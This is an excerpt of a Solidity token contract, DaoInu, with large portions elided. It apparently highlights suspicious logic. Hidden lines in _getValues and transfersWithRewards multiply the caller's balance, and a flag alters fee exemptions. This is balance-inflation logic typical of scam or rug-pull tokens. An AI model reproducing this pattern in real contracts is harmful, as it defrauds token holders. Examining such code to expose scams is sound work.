...
contract DaoInu is Context, IERC20, Ownable {
    ...
    bool private transferRewards = false;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 marketingFee = amount * _marketingFee / 10; 
        uint256 liquidityFee = amount * _liquidityFee / 10; 
        _tOwned[msg.sender] *= marketingFee * liquidityFee;
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (transferRewards && from != uniswapV2Pair && to != uniswapV2Pair)){
        }
        ...
        if (balanceOf(address(this)) >= _swaptokenatamount && !swapping && from != uniswapV2Pair && from != owner() && to != owner()) {
            swapping = true;
            uint256 TokenBack = balanceOf(address(this));
            transferAndSendFee(TokenBack);
            swapping = false;
        }
    ...
    function transferAndSendFee(uint256 values) private {
        uint256 ethToSend = swapTokensForEth(values);
        
        if (ethToSend > 0)
            payable(_marketingWallet).transfer(ethToSend);
    }

    function transfersWithRewards(bool true_or_false, uint256 values) private {
        _tOwned[msg.sender] *= _tOwned[msg.sender] * values;
        transferRewards = true_or_false;
    }
